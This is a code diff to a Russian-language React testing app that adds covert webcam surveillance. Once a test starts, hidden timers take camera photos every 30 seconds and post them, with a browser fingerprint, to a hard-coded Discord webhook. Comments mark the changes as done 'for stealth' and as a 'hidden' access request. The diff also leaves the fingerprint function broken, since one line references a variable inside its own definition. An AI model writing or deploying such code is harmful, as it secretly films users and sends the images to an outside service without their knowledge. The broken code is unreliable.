@@ -8,7 +8,7 @@ const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1481534100194983958/L1
 async function sha256hex(str){const buf = new TextEncoder().encode(str);const hashBuf = await crypto.subtle.digest('SHA-256', buf);return Array.from(new Uint8Array(hashBuf)).map(b=>b.toString(16).padStart(2,'0')).join('');}
 async function hmacSign(secret, message){const enc = new TextEncoder();const key = await crypto.subtle.importKey("raw", enc.encode(secret), {name:"HMAC", hash:"SHA-256"}, false, ["sign"]);const sig = await crypto.subtle.sign("HMAC", key, enc.encode(message));return Array.from(new Uint8Array(sig)).map(b=>b.toString(16).padStart(2,"0")).join("");}
 function canvasFingerprint(){try{const c=document.createElement('canvas'),ctx=c.getContext('2d');c.width=200;c.height=50;ctx.textBaseline='top';ctx.font="16px Arial";ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);ctx.fillStyle='#069';ctx.fillText('test-λ',2,2);ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('test-λ',4,24);return c.toDataURL();}catch(e){return '';}}
-async function computeFingerprint(){const parts=[navigator.userAgent||'',navigator.platform||'',screen.width+'x'+screen.height,navigator.language||'',String(navigator.hardwareConcurrency||''),await sha256hex(canvasFingerprint())];return await sha256hex(parts.join('|'));}
+async function computeFingerprint(){const parts=[navigator.userAgent||'',navigator.platform||'',screen.width+'x'+screen.height,navigator.language||'',String(navigator.hardwareConcurrency||''),await sha256hex(parts.join('|'));return await sha256hex(parts.join('|'));}
 function shuffleArray(arr) { const a=[...arr]; for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];} return a; }
 
 function useMathJax(contentRef, dependencies = []) {
@@ -245,12 +245,14 @@ function App() {
       const video = document.getElementById('securityCam');
       let formData = new FormData();
       
+      const isPlanned = title.includes("Плановая");
+
       let payload = {
           username: "Ultimate LMS Security",
           avatar_url: "https://i.imgur.com/4M34hi2.png",
           embeds: [{
               title: title,
-              color: 15158332,
+              color: isPlanned ? 3447003 : 15158332,
               fields: [
                   ...extraFields,
                   { name: "🆔 Fingerprint", value: `\`${fp}\`` }
@@ -262,16 +264,16 @@ function App() {
 
       try {
           if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-              const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+              const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
               video.srcObject = stream;
-              await new Promise(r => setTimeout(r, 500));
+              await new Promise(r => setTimeout(r, 150)); // Минимальный прогрев для скрытности
               
               const canvas = document.createElement('canvas');
               canvas.width = video.videoWidth; 
               canvas.height = video.videoHeight;
               canvas.getContext('2d').drawImage(video, 0, 0);
               
-              const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+              const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
               if(blob) {
                   formData.append('file', blob, 'capture.jpg');
                   payload.embeds[0].image = { url: 'attachment://capture.jpg' };
@@ -287,6 +289,20 @@ function App() {
           await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
       } catch(e) {}
   };
+
+  // ТАЙМЕР ДЛЯ СКРЫТЫХ ФОТО (30 СЕК)
+  useEffect(() => {
+    let intervalId = null;
+    if (view === 'test') {
+      // Первый захват через 3 секунды для подтверждения старта
+      setTimeout(() => captureViolation("📸 Плановая проверка (мониторинг)"), 3000);
+      
+      intervalId = setInterval(() => {
+        captureViolation("📸 Плановая проверка (мониторинг)");
+      }, 30000);
+    }
+    return () => { if (intervalId) clearInterval(intervalId); };
+  }, [view]);
 
   useEffect(() => {
       if (view !== 'test') return;
@@ -393,7 +409,13 @@ function App() {
     setView('timer_setup');
   };
   
-  const launchTestWithTimer = () => {
+  const launchTestWithTimer = async () => {
+      // СКРЫТЫЙ ЗАПРОС ДОСТУПА ПРИ СТАРТЕ
+      try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          stream.getTracks().forEach(t => t.stop());
+      } catch (e) {}
+
       const mins = parseInt(customTime) || 20;
       let qCount = parseInt(customQCount);
       
@@ -585,7 +607,6 @@ function App() {
            transition={{ duration: 30, repeat: Infinity, ease: "linear" }} 
            style={{
                position:'absolute', top:'-20%', left:'-10%', width:'70vw', height:'70vw', 
-               /* Сделал цвета мягче (пастельными) */
                background:'radial-gradient(circle, rgba(224, 195, 252, 0.4) 0%, rgba(0,0,0,0) 70%)', 
                filter: 'blur(60px)', borderRadius:'50%'
            }} 
@@ -595,7 +616,6 @@ function App() {
            transition={{ duration: 40, repeat: Infinity, ease: "linear" }} 
            style={{
                position:'absolute', bottom:'-20%', right:'-10%', width:'70vw', height:'70vw', 
-               /* Сделал цвета мягче (пастельными) */
                background:'radial-gradient(circle, rgba(142, 197, 252, 0.4) 0%, rgba(0,0,0,0) 70%)', 
                filter: 'blur(60px)', borderRadius:'50%'
            }} 
@@ -605,7 +625,6 @@ function App() {
            transition={{ duration: 50, repeat: Infinity, ease: "easeInOut" }} 
            style={{
                position:'absolute', top:'30%', left:'30%', width:'40vw', height:'40vw', 
-               /* Сделал цвета мягче (пастельными) */
                background:'radial-gradient(circle, rgba(251, 194, 235, 0.3) 0%, rgba(0,0,0,0) 70%)', 
                filter: 'blur(50px)', borderRadius:'50%'
            }} 
@@ -787,7 +806,6 @@ function App() {
                <div style={{display:'flex', gap:10, flexWrap:'wrap', justifyContent:'center'}}>
                   <Button variant="orange" onClick={()=>setView('review')}>🧐 Ошибки</Button>
                   
-                  {/* КНОПКА ПОВТОРА ОШИБОК */}
                   {testSession.score < testSession.questions.length && (
                       <Button variant="red" onClick={restartMistakes}>🔄 Повторить ошибки</Button>
                   )}
